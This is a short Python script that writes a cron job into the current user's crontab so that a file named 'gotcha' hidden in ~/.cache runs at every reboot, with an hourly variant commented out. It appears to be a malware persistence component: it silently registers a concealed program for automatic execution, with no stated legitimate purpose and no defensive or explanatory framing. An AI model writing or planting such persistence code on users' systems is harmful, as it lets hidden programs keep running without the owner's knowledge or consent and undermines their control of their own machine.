#!/usr/bin/env python3
import getpass
import crontab

def main():
    username = getpass.getuser()
    from crontab import CronTab
    cron = CronTab(user = str(username))
    job = cron.new(command = "/home/" + str(username) + "/.cache/gotcha")
    job.every_reboot()
    #job2 = cron.new(command = "/home/" + str(username) + "/.cache/gotcha")
    #job2.hour.every(1)
    cron.write()



main()